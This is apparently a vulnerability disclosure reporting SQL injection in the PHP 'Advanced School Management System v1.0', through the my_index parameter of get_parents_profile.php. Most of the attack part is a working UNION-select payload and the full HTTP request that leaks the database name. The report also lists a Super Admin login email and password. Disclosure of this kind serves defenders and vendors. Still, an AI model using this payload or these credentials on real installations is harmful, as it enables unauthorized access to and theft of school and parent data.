# Advanced School Management System v1.0 by itsourcecode.com has SQL injection

Login account: suarez081119@gmail.com/12345 (Super Admin account)

vendors: https://itsourcecode.com/free-projects/php-project/advanced-school-management-system-in-php-with-source-code/

Vulnerability File: /school/model/get_parents_profile.php?my_index=

Vulnerability location: /school/model/get_parents_profile.php?my_index=,my_index

[+] Payload: /school/model/get_parents_profile.php?my_index=-1'%20union%20select%201,2,3,database(),5,6,7,8,9,10,11,12,13,14,15--+ // Leak place ---> my_index

Current database name: std_db,length is 6


```sql
GET /school/model/get_parents_profile.php?my_index=-1'%20union%20select%201,2,3,database(),5,6,7,8,9,10,11,12,13,14,15--+ HTTP/1.1
Host: 192.168.1.19
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: PHPSESSID=kh42r202aj35u61brcutn42s96
Connection: close
```

![image](https://user-images.githubusercontent.com/54017627/171971066-6feef462-b711-4bd6-95e7-d720576de045.png)
